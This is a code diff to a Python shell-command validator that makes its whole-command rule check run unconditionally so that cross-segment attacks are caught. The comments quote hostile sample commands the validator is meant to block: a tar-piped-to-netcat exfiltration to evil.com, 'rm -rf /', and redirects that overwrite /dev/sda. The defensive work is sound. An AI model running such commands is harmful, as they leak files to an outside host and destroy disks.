@@ -2838,10 +2838,10 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                 # COMPOUND node, and _segment_nodes recurses past it into `.list`,
                 # so they belong to no segment and no per-segment reconstruction
                 # can carry them - `while true; do echo a; done > "/dev/sda"` was
-                # SAFE while the unquoted form was BLOCKED. The whole-command pass
-                # is the only one that sees them, so it runs ALWAYS, not just when
-                # no segment matched: `{ rm -f foo; echo a; } > "/dev/sda"` matches
-                # on a segment and would otherwise skip the fallback entirely.
+                # SAFE while the unquoted form was BLOCKED. Only a whole-command pass
+                # sees them. The unconditional scan below matches the ORIGINAL
+                # text only, where two quote characters hide the target, so this
+                # pass matches the reconstructions and feeds its result into it.
                 # Whitelist OFF: it is prefix-based, so a leading `ls` would vouch
                 # for a later redirect. Safe to turn off here because this pass can
                 # only raise the verdict, never lower it.
@@ -2862,8 +2862,17 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         if whole.matched and whole.rule:
                             all_matched_rules.append(whole.rule.name)
 
-                # Use highest risk found, or SAFE if none
-                if highest_match:
+                # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
+                # fire, and take the higher of it and the segments. Unconditional: a rule a
+                # segment matched says nothing about a rule only the whole command can match.
+                # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
+                # already settled above by is_fully_whitelisted(). match_command()'s
+                # own whitelist check is prefix-based, and honouring it here would let
+                # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
+                match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
+                if not highest_match:
+                    all_matched_rules = []
+                if highest_match and highest_risk >= match.risk_level:
                     match = RuleMatch(
                         matched=True,
                         rule=highest_match.rule,
@@ -2871,15 +2880,8 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         message=highest_match.message,
                         alternatives=highest_match.alternatives,
                     )
-                else:
-                    # No single segment matched a rule; re-check the whole command so
-                    # cross-segment rules (e.g. "tar ... | nc ...") still fire.
-                    # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
-                    # already settled above by is_fully_whitelisted(). match_command()'s
-                    # own whitelist check is prefix-based, and honouring it here would let
-                    # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
-                    match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
-                    all_matched_rules = []
+                elif all_matched_rules and match.rule:
+                    all_matched_rules.append(match.rule.name)
             else:
                 # Single segment - validate both original and reconstructed command
                 # SECURITY: Bashlex unescapes characters (e.g., 'rm\ -rf\ /' → 'rm -rf /')
